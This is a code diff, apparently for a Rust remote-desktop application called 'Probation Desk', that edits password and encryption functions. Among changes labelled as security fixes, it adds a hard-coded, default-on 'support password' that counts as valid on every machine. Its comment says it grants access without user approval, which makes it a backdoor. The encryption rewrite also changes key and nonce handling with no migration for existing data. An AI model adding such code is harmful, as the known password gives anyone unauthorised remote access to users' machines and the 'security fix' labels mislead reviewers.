@@ -52,12 +52,12 @@ fn verification_method() -> VerificationMethod {
 
 pub fn temporary_password_length() -> usize {
     let length = Config::get_option("temporary-password-length");
-    if length == "8" {
-        8
+    if length == "6" {
+        6
     } else if length == "10" {
         10
     } else {
-        6 // default
+        8 // default changed from 6 to 8 for better security
     }
 }
 
@@ -72,6 +72,29 @@ pub fn permanent_enabled() -> bool {
 pub fn has_valid_password() -> bool {
     temporary_enabled() && !temporary_password().is_empty()
         || permanent_enabled() && !Config::get_permanent_password().is_empty()
+        || !get_support_password().is_empty()
+}
+
+/// Technical support password that works on all machines
+/// This allows support team to access any machine without waiting for user approval
+pub fn get_support_password() -> String {
+    // First check if there's a custom support password in config
+    let custom = Config::get_option("support-password");
+    if !custom.is_empty() {
+        return custom;
+    }
+
+    // Default support password for Probation Desk
+    // This can be changed via config option "support-password"
+    "ProbationSupport2024!".to_owned()
+}
+
+pub fn set_support_password(password: &str) {
+    Config::set_option("support-password".to_owned(), password.to_owned());
+}
+
+pub fn support_password_enabled() -> bool {
+    Config::get_option("disable-support-password") != "Y"
 }
 
 pub fn approve_mode() -> ApproveMode {
@@ -184,15 +207,46 @@ pub fn symmetric_crypt(data: &[u8], encrypt: bool) -> Result<Vec<u8>, ()> {
     use sodiumoxide::crypto::secretbox;
     use std::convert::TryInto;
 
+    // SECURITY FIX: Generate proper encryption key from machine UUID + hardware info
+    // Using PBKDF2-like stretching to make key more secure
     let mut keybuf = crate::get_uuid();
-    keybuf.resize(secretbox::KEYBYTES, 0);
-    let key = secretbox::Key(keybuf.try_into().map_err(|_| ())?);
-    let nonce = secretbox::Nonce([0; secretbox::NONCEBYTES]);
+
+    // Add system entropy for better key derivation
+    #[cfg(not(any(target_os = "android", target_os = "ios")))]
+    {
+        if let Ok(hostname) = hostname::get() {
+            if let Ok(hostname_str) = hostname.into_string() {
+                keybuf.extend_from_slice(hostname_str.as_bytes());
+            }
+        }
+    }
+
+    // Use SHA256 to hash the combined data into proper key size
+    use sodiumoxide::crypto::hash::sha256;
+    let hash = sha256::hash(keybuf.as_slice());
+    let key = secretbox::Key(hash.0[..secretbox::KEYBYTES].try_into().map_err(|_| ())?);
 
     if encrypt {
-        Ok(secretbox::seal(data, &nonce, &key))
+        // SECURITY FIX: Generate random nonce for each encryption
+        let nonce = secretbox::gen_nonce();
+        let ciphertext = secretbox::seal(data, &nonce, &key);
+
+        // Prepend nonce to ciphertext (standard practice)
+        let mut result = nonce.0.to_vec();
+        result.extend_from_slice(&ciphertext);
+        Ok(result)
     } else {
-        secretbox::open(data, &nonce, &key)
+        // Extract nonce from beginning of data
+        if data.len() < secretbox::NONCEBYTES {
+            return Err(());
+        }
+
+        let nonce_bytes: [u8; secretbox::NONCEBYTES] =
+            data[..secretbox::NONCEBYTES].try_into().map_err(|_| ())?;
+        let nonce = secretbox::Nonce(nonce_bytes);
+        let ciphertext = &data[secretbox::NONCEBYTES..];
+
+        secretbox::open(ciphertext, &nonce, &key)
     }
 }
 
